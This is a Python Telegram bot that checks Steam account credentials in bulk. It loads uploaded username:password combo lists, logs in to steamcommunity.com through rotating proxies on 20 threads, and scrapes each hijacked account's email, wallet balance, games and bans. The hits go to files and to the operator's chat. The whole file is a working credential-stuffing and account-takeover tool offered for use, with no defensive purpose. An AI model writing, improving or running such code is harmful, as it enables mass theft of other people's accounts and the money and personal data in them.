#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🚀 STEAM CHECKER TELEGRAM BOT - FIXED v3 (Based on Original Working Logic)
- Fixed login detection (valid accounts no longer show as invalid)
- 20 threads for speed
- Smart non-spammy progress
- Proxy support
- /status command
"""

import os
import time
import asyncio
import logging
import re
import random
import base64
from pathlib import Path
from urllib.parse import quote_plus
from concurrent.futures import ThreadPoolExecutor

import requests
from bs4 import BeautifulSoup
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# ========================= CONFIG =========================
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
OWNER_ID_STR = os.getenv("OWNER_ID", "0").strip()

try:
    OWNER_ID = int(OWNER_ID_STR)
except ValueError:
    raise ValueError(f"❌ OWNER_ID must be a number only! (Get from @userinfobot)")

if not TELEGRAM_TOKEN:
    raise ValueError("❌ TELEGRAM_TOKEN not set in Railway!")

MY_SIGNATURE = "@pyabrodie"
TELEGRAM_CHANNEL = "https://t.me/HoTmIlToOLs"

lock = asyncio.Lock()
stats = {'valid': 0, 'invalid': 0, 'checked': 0, 'total': 0, 'start_time': None}

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ====================== HELPERS ======================
def create_results_folder():
    Path("Results").mkdir(parents=True, exist_ok=True)

def save_hit(filename, data):
    filepath = os.path.join("Results", filename)
    if not os.path.exists(filepath):
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(f"# Steam Checker - {MY_SIGNATURE}\n\n")
    with open(filepath, 'a', encoding='utf-8') as f:
        f.write(f"{data}\n")

def shorten_games(games, limit=12):
    if not games:
        return "None"
    if len(games) > limit:
        return " | ".join(games[:limit]) + f" ... (+{len(games)-limit})"
    return " | ".join(games)

# ====================== ORIGINAL-BASED CHECKER (Fixed) ======================
def check_steam_account(combo: str, proxy=None):
    try:
        username, password = combo.strip().split(':', 1)
    except:
        return None

    user_clean = re.sub(r"@.*", "", username)
    session = requests.Session()
    session.verify = False
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://steamcommunity.com",
        "X-Requested-With": "XMLHttpRequest",
    }
    session.headers.update(headers)

    try:
        # 1. Get RSA Key
        now = str(int(time.time() * 1000))
        r1 = session.post(
            "https://steamcommunity.com/login/getrsakey/",
            data=f"donotcache={now}&username={user_clean}",
            timeout=15
        )
        j1 = r1.json()
        if not j1.get("success"):
            return None

        modulus = j1.get("publickey_mod")
        exponent = j1.get("publickey_exp")
        timestamp = j1.get("timestamp")

        # 2. Encrypt password (from original)
        n = int(modulus, 16)
        e = int(exponent, 16)
        rsa_key = RSA.construct((n, e))
        cipher = PKCS1_v1_5.new(rsa_key)
        encrypted = cipher.encrypt(password.encode("utf-8"))
        pass_enc = base64.b64encode(encrypted).decode()
        pass3 = quote_plus(pass_enc)

        # 3. Login (original payload style)
        now2 = str(int(time.time() * 1000))
        payload = (
            f"donotcache={now2}&password={pass3}&username={user_clean}"
            f"&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=&captcha_text="
            f"&emailsteamid=&rsatimestamp={timestamp}&remember_login=false"
        )

        r2 = session.post(
            "https://steamcommunity.com/login/dologin/",
            data=payload,
            timeout=15
        )
        j2 = r2.json()

        if not j2.get("success"):
            return None

        # Set cookies properly (critical fix)
        for cookie in r2.cookies:
            session.cookies.set(cookie.name, cookie.value, domain="steamcommunity.com")
            session.cookies.set(cookie.name, cookie.value, domain="steampowered.com")
            session.cookies.set(cookie.name, cookie.value, domain=".steamcommunity.com")
            session.cookies.set(cookie.name, cookie.value, domain=".steampowered.com")

        # 4. Fetch full details (original parsers)
        time.sleep(0.5)
        r3 = session.get("https://store.steampowered.com/account/", timeout=15)
        email, balance, country = parse_account_page(r3.text)

        time.sleep(0.5)
        r4 = session.get("https://steamcommunity.com/my/profile/", timeout=15)
        total_games, level, limited = parse_profile_page(r4.text)

        games = []
        if int(total_games or 0) > 0:
            time.sleep(0.5)
            r5 = session.get("https://steamcommunity.com/my/games/?tab=all", timeout=15)
            games = parse_games_page(r5.text)

        # Bans
        vac_bans = game_bans = community_ban = "Unknown"
        steamid = None
        if "profiles/" in r4.url:
            steamid = r4.url.split("/profiles/")[1].strip("/")
        if steamid:
            time.sleep(0.5)
            r6 = session.get(f"https://steamcommunity.com/profiles/{steamid}", timeout=15)
            vac_bans, game_bans, community_ban = parse_ban_page(r6.text)

        result = {
            "username": username,
            "password": password,
            "email": email,
            "balance": balance,
            "country": country,
            "total_games": total_games,
            "games": games,
            "level": level,
            "limited": limited,
            "vac_bans": vac_bans,
            "game_bans": game_bans,
            "community_ban": community_ban,
        }
        return result

    except Exception as e:
        logger.debug(f"Check failed for {username}: {str(e)[:100]}")
        return None

# ====================== PARSERS (from your original) ======================
def parse_account_page(html):
    email = balance = country = "Unknown"
    try:
        soup = BeautifulSoup(html, "html.parser")
        if elem := soup.find("input", {"id": "account_name"}):
            email = elem.get("value", "Unknown")
        if elem := soup.find("a", {"id": "header_wallet_balance"}):
            balance = elem.get_text(strip=True)
        if elem := soup.find("select", {"id": "account_country"}):
            if selected := elem.find("option", {"selected": True}):
                country = selected.get_text(strip=True)
    except:
        pass
    return email, balance, country

def parse_profile_page(html):
    total_games = "0"
    level = "0"
    limited = "No"
    try:
        soup = BeautifulSoup(html, "html.parser")
        if link := soup.find("a", href=re.compile(r"/games/")):
            if span := link.find("span", class_=re.compile("count")):
                if m := re.search(r'(\d+)', span.get_text()):
                    total_games = m.group(1)
        if lvl := soup.find("span", class_=re.compile("friendPlayerLevelNum")):
            level = lvl.get_text(strip=True)
        if "limited account" in html.lower():
            limited = "Yes"
    except:
        pass
    return total_games, level, limited

def parse_games_page(html):
    games = []
    try:
        soup = BeautifulSoup(html, "html.parser")
        for name_div in soup.find_all("div", class_="gameListRowItemName")[:30]:
            if title := name_div.get_text(strip=True):
                games.append(title)
    except:
        pass
    return games

def parse_ban_page(html):
    vac_bans = game_bans = "0"
    community_ban = "No"
    try:
        if m := re.search(r'(\d+)\s+VAC ban', html, re.I):
            vac_bans = m.group(1)
        if m := re.search(r'(\d+)\s+game ban', html, re.I):
            game_bans = m.group(1)
        if "community ban" in html.lower():
            community_ban = "Yes"
    except:
        pass
    return vac_bans, game_bans, community_ban

# ====================== BOT LOGIC ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    await update.message.reply_text(
        "🤖 <b>Steam Checker Bot Ready!</b>\n\n"
        "Send <b>.txt</b> combo file (username:password)\n"
        "Optional: Send <b>proxies.txt</b>\n"
        "Commands: /status", parse_mode=ParseMode.HTML)

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    if stats['total'] == 0:
        await update.message.reply_text("No scan running.")
        return
    elapsed = int(time.time() - stats['start_time'])
    await update.message.reply_text(
        f"📊 <b>Status</b>\nChecked: {stats['checked']}/{stats['total']}\n"
        f"Valid: {stats['valid']}\nTime: {elapsed//60}m {elapsed%60}s",
        parse_mode=ParseMode.HTML)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("Only .txt files!")
        return

    await update.message.reply_text(f"📥 Received: {doc.file_name}")
    file = await doc.get_file()
    path = f"/tmp/{doc.file_name}"
    await file.download_to_drive(path)

    if "proxy" in doc.file_name.lower():
        with open(path, encoding='utf-8', errors='ignore') as f:
            proxies = [line.strip() for line in f if line.strip()]
        context.user_data['proxies'] = proxies
        await update.message.reply_text(f"✅ Loaded {len(proxies)} proxies.")
        return

    # Combo file
    with open(path, encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if ':' in line.strip() and len(line.strip()) > 5]

    await update.message.reply_text(f"✅ Loaded {len(combos)} accounts. Starting with 20 threads...")

    global stats
    stats = {'valid': 0, 'invalid': 0, 'checked': 0, 'total': len(combos), 'start_time': time.time()}

    proxies = context.user_data.get('proxies', [])

    asyncio.create_task(run_checker(combos, proxies, update.effective_chat.id, context.bot))

async def run_checker(combos, proxies, chat_id, bot):
    create_results_folder()

    async def progress_task():
        last = 0
        while stats['checked'] < stats['total']:
            await asyncio.sleep(10)
            if stats['checked'] - last >= 15 or stats['checked'] == stats['total']:
                last = stats['checked']
                try:
                    await bot.send_message(chat_id, f"🔄 Progress: {stats['checked']}/{stats['total']} | Valid: {stats['valid']}")
                except:
                    pass

    asyncio.create_task(progress_task())

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(process_single, combo, proxies, chat_id, bot) for combo in combos]
        for future in futures:
            try:
                future.result()
            except:
                pass

    # Summary
    elapsed = int(time.time() - stats['start_time'])
    summary = f"""✅ <b>SCAN COMPLETE</b>

⏱️ Time: {elapsed//60}m {elapsed%60}s
✅ Valid: {stats['valid']}
❌ Invalid: {stats['invalid']}
📊 Total: {stats['total']}

Results files sent.

💎 {MY_SIGNATURE}"""
    await bot.send_message(chat_id, summary, parse_mode=ParseMode.HTML)

    for fname in ["Valid_With_Email.txt", "Valid_Without_Email.txt", "All_Hits.txt"]:
        p = os.path.join("Results", fname)
        if os.path.exists(p) and os.path.getsize(p) > 100:
            await bot.send_document(chat_id, open(p, 'rb'), caption=fname)

def process_single(combo, proxies, chat_id, bot):
    proxy = random.choice(proxies) if proxies else None
    result = check_steam_account(combo, proxy)

    if result:
        hit_line = f"{result['username']}:{result['password']}"
        save_hit("All_Hits.txt", hit_line)

        if result['email'] and result['email'] != "Unknown":
            data = f"{hit_line}\n{result['email']}:{result['password']}"
            save_hit("Valid_With_Email.txt", data)
        else:
            save_hit("Valid_Without_Email.txt", hit_line)

        games_str = shorten_games(result['games'])
        msg = f"""✅ <b>STEAM HIT FOUND</b>

🔑 <code>{result['username']}:{result['password']}</code>
💰 Balance: {result['balance']}
🌍 Country: {result['country']}
🎮 Games: {result['total_games']} ({games_str})
📊 Level: {result['level']} | Limited: {result['limited']}
🚫 Bans: VAC {result['vac_bans']} | Game {result['game_bans']} | Comm {result['community_ban']}
📧 Email: {result['email']}

💎 {MY_SIGNATURE}"""

        try:
            asyncio.run(bot.send_message(chat_id, msg, parse_mode=ParseMode.HTML))
        except:
            pass

        with lock:
            stats['valid'] += 1
    else:
        with lock:
            stats['invalid'] += 1

    with lock:
        stats['checked'] += 1

# ====================== MAIN ======================
def main():
    create_results_folder()
    app = Application.builder().token(TELEGRAM_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(MessageHandler(filters.Document.TEXT, handle_document))

    print("🚀 Steam Checker Bot Started (20 threads) - Fixed Login")
    app.run_polling()

if __name__ == "__main__":
    main()
